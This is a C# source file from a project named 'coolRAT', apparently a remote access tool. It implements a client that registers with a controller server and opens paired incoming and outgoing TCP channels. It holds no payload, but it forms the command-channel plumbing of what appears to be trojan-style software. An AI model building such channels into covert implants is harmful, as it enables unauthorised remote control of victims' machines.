using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System.Threading;

namespace coolRAT.Libs.Connections
{
    /// <summary>
    /// Client Authorization Protocol client
    /// </summary>
    public class CAP_Client
    {
        public IPEndPoint ServerEndPoint;

        public CAP_Client(IPEndPoint serverEndPoint)
        {
            ServerEndPoint = serverEndPoint;
        }

        public Guid RegisterClient()
        {
            TcpConnection MainConnection = new TcpConnection();
            if (!MainConnection.Connect(ServerEndPoint)) return Guid.Empty;
            CAP_RegisterClientPacket registerClientPacket = new CAP_RegisterClientPacket();
            MainConnection.WaitReadyMessage();
            MainConnection.SendPacket(registerClientPacket);
            MainConnection.SendReadyMessage();
            string packet_raw = MainConnection.ReceivePacket();
            Packet packet = Packet.Deserialize(packet_raw);
            if(packet.Type == "CAP_ClientRegisteredPacket")
            {
                CAP_ClientRegisteredPacket registeredPacket = CAP_ClientRegisteredPacket.Deserialize(packet_raw);
                MainConnection.Client.Close();
                return registeredPacket.UniqueClientId;
            }
            MainConnection.Client.Close();
            return Guid.NewGuid();
        }

        public Client CreateClient(Guid authorizationTicket)
        {
            if (authorizationTicket == Guid.Empty) return null;
            TcpConnection incoming = new TcpConnection();
            TcpConnection outgoing = new TcpConnection();
            CAP_LinkConnectionPacket linkConnectionPacket;
            CAP_ConnectionLinkedPacket connectionLinkedPacket;
            Packet packet;
            string packet_raw = "";
            Client client = new Client(authorizationTicket);
            if (!incoming.Connect(ServerEndPoint)) return null;
            linkConnectionPacket = new CAP_LinkConnectionPacket(authorizationTicket, ConnectionType.Incoming);
            incoming.WaitReadyMessage();
            incoming.SendPacket(linkConnectionPacket);
            incoming.SendReadyMessage();
            packet_raw = incoming.ReceivePacket();
            packet = Packet.Deserialize(packet_raw);
            if (packet.Type != "CAP_ConnectionLinkedPacket") return null;
            connectionLinkedPacket = CAP_ConnectionLinkedPacket.Deserialize(packet_raw);
            if (!connectionLinkedPacket.Success) return null;
            client.Connection.IncomingConnection = incoming;
            if (!outgoing.Connect(ServerEndPoint)) return null;
            linkConnectionPacket = new CAP_LinkConnectionPacket(authorizationTicket, ConnectionType.Outgoing);
            outgoing.WaitReadyMessage();
            outgoing.SendPacket(linkConnectionPacket);
            outgoing.SendReadyMessage();
            packet_raw = outgoing.ReceivePacket();
            packet = Packet.Deserialize(packet_raw);
            if (packet.Type != "CAP_ConnectionLinkedPacket") return null;
            connectionLinkedPacket = CAP_ConnectionLinkedPacket.Deserialize(packet_raw);
            if (!connectionLinkedPacket.Success) return null;
            client.Connection.OutgoingConnection = outgoing;

            return client;
        }
    }
}
